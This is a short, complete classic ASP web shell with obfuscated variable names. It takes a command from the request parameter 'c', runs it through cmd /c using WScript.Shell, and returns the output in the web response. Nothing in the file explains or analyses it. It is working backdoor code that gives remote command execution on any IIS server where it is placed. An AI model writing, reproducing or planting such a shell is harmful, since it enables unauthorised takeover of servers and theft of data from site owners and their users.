<%
ILZU = Request("c")
Set uhJ = CreateObject("WScript.Shell").exec("cmd /c " & ILZU)
Response.Write(uhJ.StdOut.ReadAll)
%>
